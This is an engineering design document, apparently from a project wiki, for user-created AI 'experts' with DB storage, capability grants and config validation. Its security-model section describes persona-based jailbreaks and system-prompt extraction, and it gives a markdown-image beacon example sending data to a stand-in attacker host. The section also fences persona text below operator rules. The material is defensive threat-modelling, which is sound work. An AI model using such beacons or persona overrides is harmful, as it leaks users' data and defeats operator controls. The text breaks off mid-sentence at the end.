---
tags:
  - feature
  - experts
  - config
  - capabilities
  - multi-tenancy
related:
  - "[[config_matrix_db_overrides]]"
  - "[[observability_and_quotas]]"
  - "[[multi_tenancy]]"
  - "[[feature_development_pipeline]]"
aliases:
  - user-defined experts
  - custom experts
  - expert CRUD
  - capability grants
  - allowed models
---

# User-Defined Experts (DB-backed expert management + capability grants)

> Design doc **v2 — 2026-06-11**, from the "users create/edit/improve their own
> experts" planning conversation. Supersedes the undated v1 draft that
> previously lived in this file (landed alongside `d861ce1f`); v1's schema
> bones, API table, UI sketches, and anti-patterns are carried forward where
> still valid. The two structural changes vs v1: **(a)** bundled YAML experts
> are *overlaid*, not synced into the DB, mirroring the config-overrides
> system exactly; **(b)** a **capability-grants** layer (generalizing
> `users.can_use_vm`) gates what users may bake into an expert.

> [!important] **Decision 6 superseded (2026-06-17) — orchestrator-resolved config.**
> Agent-side expert resolution (Decision 6 below) is **retired**. The orchestrator
> now resolves the *entire* config (bundled base + default-model floor + expert
> fragment + override layers + settings matrix) into one frozen, credential-injected
> blob; the agent is a pure executor that **hydrates** it (`UniversalAgent.from_resolved`
> / `load_config_from_resolved`) and no longer reads `experts`/`config_overrides`
> from the DB. Jobs resolve+freeze at dispatch; sessions re-resolve on every attach
> (the warm-pool attach blob is the channel that fixes the 3-minute expert-session
> stall). Decision 7 (persona fencing) and Decision 9 (capability-enforcement seam)
> are preserved. See the new decision of record:
> `docs/superpowers/specs/2026-06-17-orchestrator-resolved-config-design.md` and the
> implementation plan `docs/superpowers/plans/2026-06-17-orchestrator-resolved-config.md`.

**Status (2026-06-17):** **Slice 1 write-CRUD restored + Slice-3 create-UI shipped** on `develop`
(uncommitted). The Slice-1 write endpoints had been clobbered by `6f8c635e` and were **restored**
(`orchestrator/main.py`: create/update/delete/duplicate/export/import + `ExpertCreate`/`ExpertUpdate`
+ save-time hard-deny gate), then **live-verified on dev k3d** (create → 409 dup-name →
422 credential-deny → update/version-bump → export → duplicate → delete, with `source=user`
tagging; self-cleaned). **Slice 3 (Cockpit)** shipped: the Experts page (list, type/source filters,
badges, row actions), the type-aware **create/edit editor** (identity + persona/instructions +
editable raw `config`-fragment JSON — structured tool-toggle widget deferred to a fast-follow),
delete-confirm with 409-blocker surfacing, and duplicate/export/import + nav + i18n (en full;
de-DE nav only, page strings fall back to en). Agent-side expert resolution
(`_apply_db_expert` / `ExpertsNamespace`) was **deleted** — resolution is orchestrator-only
(`services/config_resolver.py`). Tests: backend 46 + cockpit 579 green; ruff/tsc/ng-build clean.
**Still deferred:** Slice 2 (grants/enforcement + `/api/users/me/capabilities` + control greying),
project-link/`default_for` UI, test-drive, version/stats panels, the structured tool-toggle widget,
de-DE page translations. Plan: `docs/superpowers/plans/2026-06-17-expert-crud-ui.md`. **Browser-verified**
(Playwright, dev `test` user): `/experts/new` renders, auto-slug works (`Research Helper 2026` →
`research-helper-2026`), 0 console errors. A dark-on-dark contrast bug (a hardcoded `--surface-color`
fallback) was caught in the walkthrough and fixed by switching the editor/list styles to the real theme
tokens (`--panel-bg`/`--text-primary`/`--border-color`/`--danger-tint`…). The experts view is also
registered in the debug-grid `ComponentRegistryService` (separate hand-maintained registry, not
route-derived). The editor's config surface is an editable raw `config`-JSON textarea (the structured
`app-tools-group` widget is the fast-follow).

**Earlier status (Slice 1, 2026-06-15):** Orchestrator side
verified on dev k3d (CRUD, list/detail, export/import, `expert_id` plumbing,
migration `0028`); runtime agent-application acceptance (T1–T6) pending — see
`docs/tests/user_defined_experts_slice1_verification.md` (procedures) +
`docs/tests/user_defined_experts_slice1_test_gaps.md` (untested inventory). Three integration bugs
found+fixed during testing (orchestrator deployment env, delete-blocker status
literal, agent receive plumbing). NB: `project_experts`
shipped in `0028` but its link/`default_for` API is deferred to Slice 3 —
project-default experts aren't creatable yet.
**v2.1 — 2026-06-15:** open questions 1–5 resolved (decisions 15–19). Migrations
renumbered `0026`/`0027` → **`0028`/`0029`** — the original slots were taken by
`job_datasources` and `agents_aux_degraded` after v2 was written.
**v2.2 — 2026-06-15:** 8-agent codebase+web research pass. Added decisions 20–26
(ABAC framing, single-PDP enforcement, restrict-only grant scopes, grant-change
audit, name-resolution-vs-config-merge, RFC 7396 merge semantics, deletion
refinement), a **Security model** section, a normative **Merge semantics** block,
amended decisions 7 & 10 (persona trust boundary; allow-list binding), and
refreshed the stale `main.py` anchors (file refactored to ~21k lines — cite
symbols, not lines).
**v2.3 — 2026-06-15:** added decision 27 (portable import/export — experts
serialize to a `config/schema.json` bundle; import is fork-on-demand through the
create gate, *not* YAML→DB seeding) and folded the export/import API into Slice 1;
recorded two Slice-1 build decisions (reserve `0029` by doc-note, not a
placeholder file; persona/instructions wire through the existing
`config.extra["_resolved_prompts"]` layer).
**Triggered by:** Live prompt + settings overrides shipped
([[config_matrix_db_overrides]], migration `0022`). Experts are the natural
next unit: a named, owned *bundle* (config fragment + persona + display
metadata) instead of per-leaf overrides. Users should create, edit, share,
and iterate on their own experts without operator filesystem access.

## Problem

Experts are static YAML files in `config/experts/`, scanned into an in-memory
cache at orchestrator startup. Users cannot create, customize, or share expert
configurations without deployment access.

| Issue | Detail |
|-------|--------|
| No user-created experts | Only operators with deployment access can add expert configs |
| No ownership or sharing | All experts globally visible; no per-user customization |
| Project experts are brittle | Scanned from a Gitea jobs-repo `experts/` directory (`list_project_experts`, `main.py:15879`) — undiscoverable, no UI |
| No worker/session distinction in UI | Job and session create flows show the same list, but the configs extend different bases (`defaults` vs `persistent_defaults`) with incompatible schemas |
| No CRUD UI | Experts only appear as selection grids inside job/session create flows |
| No capability gating | Nothing governs which tools/models/autonomy a user could put in a config if they *could* author one — only `users.can_use_vm` exists, as a one-off boolean column |

### How it works today (anchors re-verified 2026-06-15)

> `main.py` was refactored to ~21k lines since v2 — the **symbols** below are
> authoritative; line numbers are as-of 2026-06-15 and drift (grep the symbol).

| Layer | Mechanism | Location (symbol · line @2026-06-15) |
|-------|-----------|----------|
| Config files | YAML with `$extends` deep-merge inheritance | `config/experts/{name}/config.yaml`; `deep_merge` `src/core/loader.py:173-210` |
| Name → path resolution (agent) | `resolve_config_path()` scans disk locations | `src/core/loader.py` (`resolve_config_path`) |
| Cache + read API | `_scan_experts()`; `list_experts()` `GET /api/experts`; `get_expert()` `GET /api/experts/{id}`; `_load_expert_detail()`; `reload_experts()` `POST /api/experts/reload` (admin) | `main.py`: `_scan_experts` :15612 · `_experts_cache` :15661 · `list_experts` :15664 · `reload_experts` :15679 · `_load_expert_detail` :15748 · `get_expert` :15827 |
| Project experts | Gitea jobs-repo `experts/` scan | `main.py`: `list_project_experts` :15879 · `get_project_expert` :15945 |
| Selection plumbing | `jobs.config_name`, `threads.metadata.config_name`; provisioners pass `--config {config_name}` + `AGENT_CONFIG` env | `persistent_provisioner.py:496,516`; `agent_provisioner.py:1022,1028,1080` |
| DB config overrides (the pattern to mirror) | `config_overrides` table → agent loads rows at first-run behind `CONFIG_DB_OVERRIDES_ENABLED`; lazy lookup via `MatrixResolver._db_lookup`, eager settings merge; result frozen in `serialize_resolved_config` | migration `0022`; `src/core/loader.py:60-166`; `src/agent.py:1049-1090`; `src/database/postgres_db.py:976-990` |
| The existing capability grant | `users.can_use_vm` — default-deny column; **two-step gate** `_check_vm_permission()` (kill-switch `system_settings['vm_workspaces']` blocks *everyone* incl. admins → admin-bypass early-return → per-user check) | `_check_vm_permission` `main.py:2129-2164` (call sites :2733,:4716); admin PATCH `admin_patch_user` :18731 (update :18758) |
| Per-user preference bag | `users.settings` JSONB, self-service `PATCH /api/settings/preferences` (renamed from `/users/me/settings`); **`settings.persistent_agent` merged as the base of session `config_override`** | `PATCH /api/settings/preferences` `main.py:17640`; merge in `create_persistent_thread` `main.py:12572-12620` |
| Subjob expert references | `verification.critic_config` / `scholar.scholar_config` / `curator.curator_config`, defaulting to hardcoded names; sections read from disk only | `main.py` (`critic_config`/`scholar_config`/`curator_config`); `completion.py` |

The `users.settings.persistent_agent → config_override` path matters for
security: a *user-writable* preference bag already flows into agent config
today. Capability enforcement must therefore validate the **merged
dispatch-time result**, not just saved experts — otherwise any expert-level
check is bypassable via a settings PATCH.

## Locked decisions

| # | Decision | Value |
|---|---|---|
| 1 | Storage model | **Overlay with fallback**, exactly like prompts/settings overrides: bundled YAML experts stay disk-resolved and canonical; the DB holds only user/admin-created rows. No YAML→DB seeding (v1 draft's sync model dropped — it duplicates truth and needs reload-overwrite hacks). Delete the row → shipped behavior returns. |
| 2 | Table | Dedicated `experts` table (migration `0028`, **not** `schema.sql` — frozen at cutover). Not a new `kind` in `config_overrides`: owner/visibility columns don't belong there. |
| 3 | Expert typing | `expert_type ∈ {worker, session}`, immutable after create. Determines the base config (`defaults.yaml` vs `persistent_defaults.yaml`). Structural, not cosmetic — the schemas are incompatible. |
| 4 | No `$extends` in user configs | The base is implied by `expert_type`. "Start from scholar" = **fork (copy)** of its fragment, not a live link. Live extension chains (cycle/depth/visibility machinery) deferred. |
| 5 | Selection | Pickers pass **`expert_id` (UUID)**; `jobs` gains a nullable `expert_id` column, threads carry `metadata.expert_id`. `config_name` remains for bundled experts and back-compat. Name-based resolution (automations, MCP convenience): **owner > project-linked > global > bundled** (most-specific wins; a personal fork named `scholar` shadows the bundled one *for that user only*). |
| 6 | ~~Agent-side resolution~~ **SUPERSEDED 2026-06-17** | ~~The agent loads the expert row itself at job/session start via the app-DB connection it already holds, behind an `EXPERTS_DB_ENABLED` flag~~. **Replaced by orchestrator-resolved config** (see banner at top): the orchestrator resolves the full config and emits a frozen blob; the agent hydrates it and never reads `experts`/`config_overrides` from the DB. `EXPERTS_DB_ENABLED` now gates *orchestrator* resolution. |
| 7 | Per-expert prompts | `experts.prompts` JSONB (v1 keys: `persona`, `instructions`) is the **highest-precedence *content* layer** for resolving prompt text (expert → family DB → global DB → bundled file). **But it is NOT injected at system-prompt altitude:** the user persona is fenced as a delimited, explicitly-subordinated *style request* **below** a non-overridable operator/safety policy — it cannot override operator rules, tool/model/autonomy gates, or safety (capabilities are config-gated at dispatch, not prompt-gated). See **Security model → Persona trust boundary**. Single text per key in v1; per-model-family variants deferred. |
| 8 | Capability grants | New scoped table `capability_grants(scope_kind ∈ {user, project, global}, scope_id, key, value_json)` + code-side catalog — the principal-scoped twin of `config_overrides` and the generalization of `can_use_vm` (which migrates in). Resolution: user → project → global row → catalog default. Admins bypass. Kill-switch `system_settings['user_experts']`. |
| 9 | Enforcement points | Twice, like `can_use_vm` today: **save-time** (422 with actionable message; editor greys out ungated controls) and **dispatch-time** on the *full merged config* (expert fragment + project override + `users.settings.persistent_agent` + job/thread `config_override`) against the **runner's** grants. Dispatch check **rejects** (no silent stripping — silent capability downgrades burn debugging time). This single checkpoint also closes the `persistent_agent` self-service hole. |
| 10 | Credential sections unbindable | `llm.api_key`/`env_keys`, `connections`, `workspace.remote` never come from user content — credentials only ever come from orchestrator dispatch injection (existing invariant). Primary defense is **allow-list binding** (the writable surface is a strict per-`expert_type` pydantic model, `extra="forbid"` at *every* nesting level; these sections simply aren't fields → structurally unbindable). The explicit **deny-scan** is defense-in-depth, run on the **canonicalized, post-merge** tree (Security model → Config validation), never the sole gate — deny-lists alone are bypassable. |
| 11 | Subjob references (v1) | `critic_config`/`scholar_config`/`curator_config` in user experts must name **bundled** experts (validated at save). `completion.py`'s disk readers stay untouched; DB-aware subjob resolution deferred. |
| 12 | Versioning (v1) | Lite: `version` int incremented on update + `updated_by`. Full history/rollback deferred. Running jobs are already immune to edits via the `resolved_config` freeze. **Test-drive** ships in v1: run a draft as a plain `config_override` without saving. |
| 13 | Quotas | Separate concern. `quota_limits` stays as designed in [[observability_and_quotas]] (scope-polymorphic, period-based, evaluated by the usage rollup). Grants and quota enforcement share only the dispatch seam. |
| 14 | Global publishing | Setting `is_global=TRUE` is **admin-only** in v1 (a future `publish_global` grant key can open it up). |
| 15 | Expert deletion | **Block while live-referenced** (409 enumerating blockers): refuse delete while any active (non-ended) thread carries `metadata.expert_id` = this expert, **or** any automation's `expert` *name* resolves to this expert with no lower-precedence same-name fallback. Finished and already-running `jobs` **never** block (`resolved_config` frozen; `jobs.expert_id` `ON DELETE SET NULL` covers history) — but **pending/unstarted** jobs with `expert_id` set *do* count as live refs, else SET NULL would silently drop them to base config and violate decision 6. The owner repoints/removes the live refs first. Chosen over "delete + fail-loud" because automations fire **unattended** — a silent cron break is worse than friction. |
| 16 | Project experts ↔ datasources | **Orthogonal.** A project-default expert does **not** auto-attach the project's datasources. Explicit selection (`job_datasources`, `threads.metadata.datasource_ids`) stays the only path — preserves the existing explicit-selection invariant (`resolve_datasources_for_job/thread` return only explicit picks) and avoids silent data-access escalation when someone picks the default expert. Turnkey-by-project, if ever wanted, is a project-level *default datasource set* applied at create — not expert-coupled. |
| 17 | Datasource grant granularity | **Single `datasource_tools` key**, not per-kind. The real data boundary is datasource *selection* + per-source `read_only`, not the tool family — per-kind tool grants would gate nothing the selection doesn't already. Catalog makes a later `sql`/`mongodb`/`graph` split additive and non-breaking. |
| 18 | Advanced (raw YAML/JSON) editor | **Admin-only in v1.** Not a security boundary either way — decision 9's dispatch-time validation checks the merged fragment *however authored*, so raw input cannot smuggle ungated keys past dispatch. Admin-gating is blast-radius/footgun only. A `raw_config` grant key is deferred until the validators are proven. |
| 19 | `model_selection` default | **All enabled catalog models** (∅ = unconstrained); narrowing is opt-in per user/project/global. S2 enforcement is therefore a **no-op on upgrade** — it only bites once an admin narrows. NB: there is **no** server-side model gate today (`_inject_model_credentials()`, `main.py:2431-2504`, silently provider-infers unknown models at `:2461` rather than rejecting), so `model_selection` is the *first* such gate — hence the permissive default to avoid breaking existing free choice. |
| 20 | Naming / model | "Capability" here = **feature entitlement (ABAC/PBAC, NIST SP 800-162)**, *not* object-capability security: authority resolves from the subject's identity/scope (ambient authority), not an unforgeable token. The `capability_grants` name is kept for continuity; read "capability" as "entitlement," and don't assume ocap guarantees (unforgeability, token delegation). |
| 21 | Single PDP, two PEPs | Save-time and dispatch-time MUST call **one shared decision function** `evaluate(merged_config, grants) -> {allowed, violations[]}`. Save-time runs it on the saved fragment (UX); dispatch-time runs the *identical* function on the full merged stack (authority). One implementation ⇒ the two enforcement points can't drift. (XACML framing: two PEPs, one PDP; the code catalog is the PAP; grant/config reads are the PIP.) The generalized check is **new code** mirroring `_check_vm_permission`'s two-step shape. |
| 22 | Per-key scope semantics | Catalog keys are **`restrict-only`** by default — a more-specific scope may only *narrow*, never *widen*, the inherited value (a user row cannot exceed a project/global cap). `autonomy_ceiling`, `shell_tools`, `vm_workspace`, `delegation`, `browser` are restrict-only; only genuinely-independent toggles may be `override`. Pure most-specific-wins would let a user grant exceed an admin ceiling — a privilege-escalation footgun (cf. Cerbos `REQUIRE_PARENTAL_CONSENT` vs `OVERRIDE_PARENT`). Security-relevant keys **default-deny**; `model_selection`/`datasource_tools` may default-allow with the inline justification already given. |
| 23 | Grant-change audit | Mutable `granted_by`+`updated_at` is current-state, not an audit trail (a DELETE erases the actor). Add an **append-only** `capability_grant_audit(actor, scope_kind, scope_id, key, old_value, new_value, action, reason, at)`, written on every grant/update/revoke incl. admin-bypass (OWASP `authz_change` record). |
| 24 | Two different merges | **Name-resolution = replacement** (pick *one whole* expert by owner>project>global>bundled; a personal `scholar` shadows the bundled one *entirely* — never a half-and-half merge). **Config-layering = additive deep-merge** *within* the chosen expert (decision 1's chain). Distinct; must not be conflated. Global experts are **shadowable** (personal/project forks win by name); an admin who needs *non-overridable* behavior uses a **grant** (the enforcement layer), not a global expert (the convenience layer). |
| 25 | Merge semantics = RFC 7396 | `deep_merge` is **JSON Merge Patch (RFC 7396)**: objects recurse, **arrays replace wholesale** (no append), **`null` deletes the key** (so a field can't be set to `null`, and a fragment can *delete a base guardrail*), scalars replace. Security-relevant — the validator scans the *post-merge* result. See **Merge semantics (normative)**. Fix the `base.copy()` shallow-copy aliasing in `loader.py` before user fragments flow through it. |
| 26 | Deletion blocker classes | Refining decision 15: the 409 body **enumerates** blockers (`{type,id,label,link}`) and the editor offers **reassign/repoint-then-delete** (WordPress-style). Split by blast radius — **hard id-refs** (active thread, pending job) = hard block, no override; **name-only automation refs** = block but allow an *explicit, logged* repoint-confirmation that **shows the post-delete resolution target** ("3 automations will fall back to bundled `scholar`") so the unattended-cron change is acknowledged, never silent. 409 is correct (RFC 9110 §15.5.10); soft-delete rejected (re-create-`scholar` unique collision, FK-tombstone incompatibility, GDPR retention, silent cron drift). |
| 27 | Portable import/export | Experts serialize to a portable **bundle** — the `ExpertCreate` shape `{name, display_name, description, icon, color, tags, expert_type, config, prompts}`, validated by the existing `config/schema.json`. **Export** serializes any visible expert (bundled or DB) to a JSON file (the **raw fragment**, never the merged result — anti-pattern 3); **import** runs the *same save-time gate as create* (canonicalize → hard-deny → S2 grants) and creates an **owned** row (**fork-on-import**; name collision suffixed like duplicate). File = transport, DB = runtime; this is decision 4's fork-by-copy across the app boundary, explicitly **not** the YAML→DB seeding rejected in decision 1 (user-initiated + validated, never automatic). JSON canonical; YAML accepted on import (superset parse). Registry / marketplace / share-by-link stay deferred. |

## Architecture

### `experts` table — migration `0028_experts.sql`

```sql
CREATE TABLE IF NOT EXISTS experts (
    id           UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name         VARCHAR(100) NOT NULL,        -- slug ^[a-z][a-z0-9_-]*$
    display_name VARCHAR(200) NOT NULL,
    description  TEXT,
    icon         VARCHAR(100) NOT NULL DEFAULT 'smart_toy',
    color        VARCHAR(7)   NOT NULL DEFAULT '#6B7280',
    tags         TEXT[]       NOT NULL DEFAULT '{}',
    expert_type  VARCHAR(10)  NOT NULL CHECK (expert_type IN ('worker', 'session')),
    config       JSONB        NOT NULL DEFAULT '{}',  -- fragment vs the type's base; never the merged result
    prompts      JSONB        NOT NULL DEFAULT '{}',  -- v1 keys: persona, instructions
    owner_id     UUID         NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    is_global    BOOLEAN      NOT NULL DEFAULT FALSE,
    version      INTEGER      NOT NULL DEFAULT 1,
    updated_by   UUID         REFERENCES users(id) ON DELETE SET NULL,
    created_at   TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
    updated_at   TIMESTAMPTZ  NOT NULL DEFAULT NOW()
);
CREATE UNIQUE INDEX IF NOT EXISTS uq_experts_name_owner ON experts (name, owner_id);
CREATE INDEX IF NOT EXISTS idx_experts_owner ON experts (owner_id);
CREATE INDEX IF NOT EXISTS idx_experts_type  ON experts (expert_type);

-- selection plumbing
ALTER TABLE jobs ADD COLUMN IF NOT EXISTS expert_id UUID REFERENCES experts(id) ON DELETE SET NULL;
```

Bundled names are *not* reserved — shadowing is by design (decision 5); the
UI badges a shadowing expert. `ON DELETE SET NULL` on `jobs.expert_id` is safe
for history because `resolved_config` is frozen per job.

### `project_experts` junction (same migration)

```sql
CREATE TABLE IF NOT EXISTS project_experts (
    project_id      UUID NOT NULL REFERENCES projects(id) ON DELETE CASCADE,
    expert_id       UUID NOT NULL REFERENCES experts(id) ON DELETE CASCADE,
    default_for     VARCHAR(10) CHECK (default_for IN ('worker', 'session')),  -- NULL = linked, not default
    config_override JSONB,                        -- project-level tweaks on top of the expert fragment
    linked_at       TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    PRIMARY KEY (project_id, expert_id)
);
-- one default worker + one default session expert per project
CREATE UNIQUE INDEX IF NOT EXISTS uq_project_default_expert
    ON project_experts (project_id, default_for) WHERE default_for IS NOT NULL;
```

(v1 draft amendment: `is_default BOOLEAN` allowed only one default *total*;
`default_for` allows one per type.)

Linking is owner-driven (link your own or a global expert to projects you're
a member of). The junction supersedes the Gitea `experts/` directory scan,
which is deprecated once this ships (read kept during a migration window).

### `capability_grants` — migration `0029_capability_grants.sql`

```sql
CREATE TABLE IF NOT EXISTS capability_grants (
    id         UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    scope_kind VARCHAR(10) NOT NULL CHECK (scope_kind IN ('user', 'project', 'global')),
    scope_id   UUID,        -- user_id | project_id | NULL for global
    key        VARCHAR(64)  NOT NULL,
    value_json JSONB        NOT NULL,
    granted_by UUID REFERENCES users(id) ON DELETE SET NULL,
    created_at TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
    CHECK ((scope_kind = 'global') = (scope_id IS NULL))
);
-- PG15+: NULLS NOT DISTINCT treats the global-scope NULL as one value, with no
-- sentinel-UUID collision class. Verify Postgres >= 15; else keep the COALESCE idiom.
CREATE UNIQUE INDEX IF NOT EXISTS uq_grants_scope_key
    ON capability_grants (scope_kind, scope_id, key) NULLS NOT DISTINCT;

-- migrate the existing one-off grant
INSERT INTO capability_grants (scope_kind, scope_id, key, value_json, granted_by)
SELECT 'user', id, 'vm_workspace', 'true'::jsonb, NULL FROM users WHERE can_use_vm
ON CONFLICT DO NOTHING;
```

No FK on `scope_id` (polymorphic — same call as `quota_limits` in
[[observability_and_quotas]]). Because there's no FK, **deleting a user or
project must delete its grant rows in app code** (no cascade fires) — else
live-looking orphan grants linger (a latent privilege leak if IDs are reused).
`users.can_use_vm` reads switch to the grants service in S2 **fallback-compatibly**
(during rollout the resolver tries the grants row, else the legacy column); the
column drops only in a later cleanup migration.

**Grant catalog** (code-side, like the config catalog: key, type, default,
what it gates, description):

| Key | Type | Default | Gates in expert/override config |
|---|---|---|---|
| `vm_workspace` | bool | deny | `workspace.backend: vm` (replaces `can_use_vm`) |
| `shell_tools` | bool | deny | `tools.shell` |
| `delegation` | bool | deny | `delegation.*`, `tools.delegation` |
| `datasource_tools` | bool | allow | `tools.sql` / `mongodb` / `graph` |
| `browser` | bool | allow | `tools.browser_direct` |
| `model_selection` | list | **all enabled** | which `models.yaml` entries are pickable (feeds expert editor *and* session model picker). Default = every enabled catalog model (∅ constraint); narrowing is opt-in — decision 19 |
| `autonomy_ceiling` | enum | `review` | max `autonomy` (`full` > `review` > `partial` > `guided` > `dependent`) |

Resolution mirrors expert layering: user row → project row → global row →
catalog default. Admins bypass everything (decision 21's `evaluate()` short-circuits).
Per decision 22 the cascade is **restrict-only** for security keys (a child scope
narrows, never widens). `browser` is default-**allow** today only to avoid breaking
existing flows — flag it for a deny-by-default review once the grants UI lands.

### Resolution flow (agent, job/session start)

```
1. Dispatch carries expert_id (env AGENT_EXPERT_ID / JobStartRequest field);
   config_name continues to carry bundled names.
2. expert_id present + EXPERTS_DB_ENABLED:
     load row from app DB (postgres_db.py, same pattern as
     list_overrides_for_family) — missing row => fail job with clear error
   else: resolve_config_path(config_name) on disk, as today.
3. Base from expert_type: defaults.yaml | persistent_defaults.yaml.
4. deep_merge: base <- expert.config (DB fragment or YAML file)
5. deep_merge: <- project_experts.config_override (orchestrator passes it in dispatch metadata)
6. Apply model_config_matrix for the resolved model family (existing).
7. Apply DB config_overrides (existing 0022 layer, family/global).
8. deep_merge: <- job/thread config_override (existing; per-job overrides win).
9. experts.prompts entries registered as the top layer of MatrixResolver:
   expert -> family DB -> global DB -> bundled file.
10. Freeze into jobs.resolved_config (existing) — edits never touch running work.
```

The orchestrator needs the same DB read for `_load_expert_detail`
(`main.py:15748`) so the UI detail view shows the resolved result, and
`/api/experts` becomes a merge of the disk scan + DB rows visible to the
caller (owned + project-linked + global), each tagged with `source`. Reuse
`user_visible_project_ids()` (`security/access.py`) for the project-linked set.

**Prompts-layer mechanism (decide before Slice 1):** step 9 is *not* a special
injection — wire it through the existing `MatrixResolver._db_lookup` chain, either
as a new `(kind='expert_prompts')` bucket loaded into the process-local override
map, or a dedicated expert-prompts map checked first. Either way the freeze in
`serialize_resolved_config` already captures the resolved text.

### Merge semantics (normative)

Every `deep_merge` in the resolution chain is **JSON Merge Patch (RFC 7396)** —
which is exactly what `src/core/loader.py:173-210` already implements:

1. **Objects** merge recursively (per-key, last layer wins per leaf).
2. **Arrays replace wholesale** — no append, no merge-by-key. A higher layer that
   touches one element must resend the whole list. *Security:* a fragment can swap
   out an allow-list array entirely.
3. **`null` deletes the key** (RFC 7396). Consequences: a field **cannot** be set
   to JSON `null`, and a fragment can **remove a base key — including a safety
   default**. The deny/grant scan therefore runs on the *post-merge* result, and
   guardrail keys are re-asserted, never assumed present.
4. **Type mismatch across layers** (scalar↔object↔array) is **rejected at
   save-time** for user fragments (silent coercion hides authoring mistakes).
5. **Deep-copy the base before merging** — today's `base.copy()` is shallow and
   aliases nested base structures into the result (latent corruption once user
   fragments flow through; fix as a hardening item — decision 25).

### Enforcement flow (orchestrator)

```
Save-time   (POST/PUT /api/experts):  validate fragment against author's
            grants + hard-deny list => 422 with the offending keys named.
Dispatch    (job create / session create / automation fire):  validate the
            FULL merged override stack against the RUNNER's grants
            => reject with actionable message. Covers experts, per-job
            overrides, and users.settings.persistent_agent uniformly.
```

A revoked grant therefore disables affected experts at next dispatch — no
background sweep needed (a **bounded TOCTOU window**, CWE-367, ≈ max run
duration; mid-run re-evaluation/kill is deferred and accepted). Shared/global
experts run under the runner's grants, not the author's — the **CWE-441
confused-deputy** mitigation. Today only `_check_vm_permission()` (`main.py:2129`)
does dispatch-time gating; the generalized `evaluate(merged_config, grants)`
(decision 21) is **new code** mirroring its two-step shape (kill-switch →
admin-bypass → per-key restrict-only resolution). If the grants read fails,
**fail closed** for deny-by-default keys.

## API surface

| Method | Path | Purpose |
|--------|------|---------|
| `GET` | `/api/experts` | Merged list (bundled + visible DB rows). Query: `type`, `source`, `project_id` |
| `POST` | `/api/experts` | Create (grant-validated). Body: `ExpertCreate` |
| `GET` | `/api/experts/{id}` | Detail with resolved config (works for bundled names and UUIDs) |
| `PUT` | `/api/experts/{id}` | Update, owner only; bumps `version`. Bundled experts → 403 |
| `DELETE` | `/api/experts/{id}` | Owner only. Bundled → 403. Blocks (409) while live-referenced — decision 15 |
| `POST` | `/api/experts/{id}/duplicate` | Fork as owned copy (any viewer; bundled experts too — this is "start from scholar") |
| `GET` | `/api/experts/{id}/export` | Serialize to a portable `config/schema.json` bundle (any viewer; bundled + DB) — decision 27 |
| `POST` | `/api/experts/import` | Create an owned expert from a posted bundle (validated like create; fork-on-import) — decision 27 |
| `POST` | `/api/experts/reload` | Existing: re-scan bundled YAML cache (admin) |
| `GET/POST/PATCH/DELETE` | `/api/projects/{pid}/experts[/{eid}]` | Link / overrides / default-for / unlink |
| `GET` | `/api/admin/grants?scope_kind=&scope_id=` | List grants + catalog (admin) |
| `PUT/DELETE` | `/api/admin/grants/{scope_kind}/{scope_id}/{key}` | Set/clear a grant (admin; extends the `admin_patch_user` `main.py:18731` pattern; writes the audit row — decision 23) |
| `GET` | `/api/users/me/capabilities` | Resolved grant set for the caller (drives editor greying + pickers) |

MCP server gains the matching tools (`create_expert`, `update_expert`,
`delete_expert`, `link_expert_to_project`, …) alongside the existing
`list_experts`/`get_expert`/`reload_experts` (`mcp/client.py:1096-1149`).

## Cockpit UI

**Experts page** (nav slot + layout pattern: the datasources tab). List with
type/source filters; bundled experts badged + read-only with "Duplicate to
customize"; shadowing experts badged ("overrides built-in *scholar* for you").

**Type-aware editor** (v1 surface deliberately small):
- Identity: name, display name, description, icon, color, tags
- Persona prompt (textarea — the heart of it) + optional instructions
- Model picker (entries from resolved `model_selection` grant)
- Autonomy (capped at `autonomy_ceiling`; higher options greyed with tooltip)
- Tool toggles (curated; ungated-off toggles greyed per grants)
- Worker-only: verification/scholar/curator toggles (bundled refs only, decision 11)
- Session-only: `interactive.permission_mode`, idle timeout, greeting
- Advanced flap: raw YAML/JSON fragment editor (admin-only in v1)
- **Test-drive**: launch a session/job with the unsaved draft as `config_override`

Reuses the admin-config building blocks (typed controls from the catalog,
bundled-default panel, reset semantics) and the tool-category checkboxes from
`agent-settings`. Job-create filters `type=worker`; session-create
(`session-create.component.ts`) filters `type=session`; project-linked
experts listed first with badge. **Admin → Users** grows from the lone VM
toggle into the grants panel (per-user; project + global grant editing on the
admin config page).

## Security model

User-authored experts add three trust surfaces. Capability-gating bounds the
**blast radius** but does not prevent **misuse within granted authority**, so each
surface needs its own defense.

### Persona trust boundary (decision 7)

Injecting a user persona at system-prompt altitude is the textbook
instruction-hierarchy anti-pattern: the system tier is the *most-trusted*, persona
text the *least* (arbitrary user input). Persona-modulation is a measured jailbreak
(42–61% harmful-completion across frontier models). Therefore:
- **Subordinate, don't elevate.** A non-overridable operator/safety policy sits at
  true top priority; the persona is fenced (`<user_persona>…</user_persona>`,
  spotlighting/delimiting) and framed as a *style request* that must not override
  rules or tool/model/autonomy gates. Capability *widening* is already impossible
  (config-gated at dispatch, not prompt-gated); fencing closes the *rule-override*
  and *altitude* holes that gating doesn't touch.
- **Shared/global personas = untrusted third-party code.** Author ≠ runner ⇒ A's
  text executes under B's identity, grants, and data (confused deputy). Treat
  publication as a review/provenance event; it always runs under the **runner's**
  grants (decision 9).
- **Output-exfiltration guardrail.** A persona can exfiltrate via *granted*
  channels with no new grant — the classic vector is markdown-image beaconing
  (`![](https://attacker/?d=…)`). Sanitize/allow-list outbound URLs and
  high-entropy markdown image/link payloads on the output path.
- Assume system-prompt extraction succeeds (~90% in the wild): keep nothing
  load-bearing (keys, other-tenant data) in context; enforce tenant isolation at
  the data layer, not via persona text.

### Config validation (decisions 9, 10, 25)

- **Allow-list binding is primary**, deny-list is defense-in-depth. The writable
  surface is a strict per-`expert_type` pydantic model (`extra="forbid"`,
  `strict=True`, closed at *every* nesting level via a shared base); credential
  sections are absent → structurally unbindable (guards OWASP mass-assignment /
  API3 BOPLA).
- **Canonicalize before every deny-scan.** One shared parser → reject duplicate
  object keys (I-JSON / RFC 7493) → NFKC + case-fold + separator-normalize keys →
  recursive walk of objects *and* arrays → **consume the re-serialized validated
  object, never the original bytes.** Blocks the bypass family: duplicate-key
